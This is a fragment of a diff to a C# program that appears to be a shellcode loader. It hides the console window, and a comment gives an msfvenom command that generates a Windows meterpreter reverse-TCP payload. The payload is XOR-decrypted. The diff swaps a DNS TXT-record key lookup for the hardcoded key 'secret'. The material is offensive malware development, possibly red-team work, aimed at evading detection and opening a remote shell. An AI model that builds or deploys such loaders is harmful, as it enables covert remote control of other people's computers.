@@ -30,7 +30,7 @@ namespace code2
 
 			const int SW_HIDE = 0;
 			const int SW_SHOW = 5;
-
+/*
         static string GetTxtRecords(string domain)
         {
 
@@ -47,6 +47,7 @@ namespace code2
         static void Main(string[] args)
         {
             IntPtr handle = GetConsoleWindow();
+	    */
 /*
 XOR encrypt:
 // 1. msfvenom --payload windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=8443 --format raw --out /tmp/data.bin
@@ -72,7 +73,7 @@ for (int i = 0; i < data.Length; i++)
 			
 
 
-			string key = GetTxtRecords("abc");
+			string key = "secret";
 			byte[] keyBytes = System.Text.Encoding.ASCII.GetBytes(key);
 			for (int i = 0; i < data.Length; i++)
 			{
